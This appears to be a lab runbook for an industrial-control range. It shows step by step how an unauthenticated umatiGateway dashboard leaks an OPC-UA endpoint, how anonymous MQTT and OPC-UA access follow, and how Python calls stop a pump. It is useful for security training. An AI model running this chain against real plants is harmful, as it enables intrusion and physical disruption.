# Runbook: guild-exchange

## Discovery

The DMZ address 10.10.5.10 may surface in prior loot or appear in a port scan. Port 8080 is reachable from the internet
zone.

```bash
ponder@unseen-gate:~$ nmap -sV 10.10.5.10
```

Port 8080 shows as an HTTP service under a .NET/Kestrel server. Port 4840 does not appear; the OPC-UA endpoint is not
directly reachable from this vantage point. Port 8080 is the only surface from here.

## Management console

```bash
ponder@unseen-gate:~$ curl -s -o /dev/null -w '%{http_code}' http://10.10.5.10:8080/
```

Returns `200`. No redirect, no authentication challenge. A management interface responding with 200 to an
unauthenticated request is already a finding.

```bash
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/
```

The response is the umatiGateway management dashboard: a .NET application that bridges OPC-UA data to MQTT. The page
shows current connection status, which OPC-UA nodes are subscribed, and where the output goes. None of this requires a
login. This is CVE-2025-27615.

## OPC endpoint

```bash
ponder@unseen-gate:~$ curl -s http://10.10.5.10:8080/OPCConnection
```

The full OPC-UA client configuration appears in the response: endpoint URL `opc.tcp://10.10.5.13:4840`, security mode
None, anonymous authentication. The gateway connects to guild-register at startup and sees no reason to restrict read
access to its own configuration. An address inside the DMZ, not reachable from the internet zone, has just appeared in
plain text.

## MQTT output

The dashboard also reveals the MQTT destination: clacks-relay at `10.10.5.12:1883`. From a machine with access to port
1883 and a mosquitto client:

```bash
mosquitto_sub -h 10.10.5.12 -t 'umati/#' -v
```

Messages arrive within a few seconds of connecting under the `umati/v2/umati-guild-exchange/` prefix. The topic
structure confirms which OPC-UA nodes are being monitored:

```
umati/v2/umati-guild-exchange/online/nsu=http_3A_2F_2Fwww.cumulocity.com;i=7   1
umati/v2/umati-guild-exchange/online/nsu=http_3A_2F_2Fwww.cumulocity.com;i=9   1
umati/v2/umati-guild-exchange/online/nsu=http_3A_2F_2Fwww.cumulocity.com;i=11  1
umati/v2/umati-guild-exchange/BaseDataVariableType/nsu=http_3A_2F_2Fwww.cumulocity.com;i=7   {}
umati/v2/umati-guild-exchange/BaseDataVariableType/nsu=http_3A_2F_2Fwww.cumulocity.com;i=9   {}
umati/v2/umati-guild-exchange/BaseDataVariableType/nsu=http_3A_2F_2Fwww.cumulocity.com;i=11  {}
```

The payloads are `{}`. guild-exchange subscribes to those nodes and forwards the events, but cannot serialise plain
process-value nodes into the umati schema it expects, so nothing lands in the payload. The topic structure is the
finding: it names the OPC-UA namespace, confirms which nodes are monitored (nodes 7, 9, 11 on Pump01: operatingLevel,
flow, power), and reveals where the output goes. The process values are not visible here.

## Direct OPC-UA access

The `/OPCConnection` response named guild-register as `opc.tcp://10.10.5.13:4840` with SecurityMode None and anonymous
authentication. Port 4840 is not reachable from the internet zone. From a foothold inside the DMZ, such as
contractors-gate, it is:

```python
root@contractors-gate:~# /venv/bin/python3
>>> from asyncua.sync import Client
>>> c = Client("opc.tcp://10.10.5.13:4840")
>>> c.connect()
>>> for node in c.nodes.objects.get_children():
...     name = node.read_browse_name()
...     print(name.Name, node.nodeid)
...     for child in node.get_children():
...         print("  ", child.read_browse_name().Name, child.nodeid)
...
```

The output maps the address space. Three pump objects appear under Objects: Pump01 (`ns=2;i=6`), Pump02 (`ns=2;i=40`),
and Pump03 (`ns=2;i=53`). guild-exchange only subscribes to Pump01. All three carry variable nodes (operatingLevel,
status, flow, power, and others), but only Pump01 carries method nodes; Pump02 and Pump03 are read-only, ending at
`commandSuccess`. Pump01's methods sit as direct children: `stopPump`, `startPump`, `resetFilter`, `changeOil`, plus the
setters `setOperatingLevel`, `setFilterDegradationRate`, `setAutoResetMinutes`. No credential is required at any point.

To stop Pump01:

```python
>>> pump = c.nodes.objects.get_child(["2:Pump01"])
>>> pump.call_method("2:stopPump")
True
>>> c.get_node("ns=2;i=8").read_value()  # status
'Running'
```

The status stays `Running` while the `operatingLevel` node (i=7) ramps down toward zero. When it reaches zero the status
changes to `Idle`. Nothing in the MQTT stream indicates why the values stopped arriving.

## What you can know now

Access:

- Management dashboard at `http://10.10.5.10:8080/` from the internet zone, no credentials required
- OPC-UA endpoint exposed by the dashboard: `opc.tcp://10.10.5.13:4840`, SecurityMode None, anonymous

Data:

- MQTT broker receiving the output: `10.10.5.12:1883`, anonymous connections accepted
- Topic structure confirms Pump01 nodes 7, 9, and 11 are actively subscribed; payloads arrive as `{}` (schema mismatch
  in the gateway)
- Process values are readable directly from guild-register via OPC-UA (port 4840, DMZ access needed)

Three pump objects on guild-register: Pump01 (`ns=2;i=6`), Pump02 (`ns=2;i=40`), Pump03 (`ns=2;i=53`). guild-exchange
only subscribes to Pump01. Only Pump01 exposes methods; Pump02 and Pump03 are read-only.

Methods callable on Pump01 (direct children, no subfolder):

- `stopPump`, `startPump`, `resetFilter`, `changeOil`
- `setOperatingLevel`, `setFilterDegradationRate`, `setAutoResetMinutes`

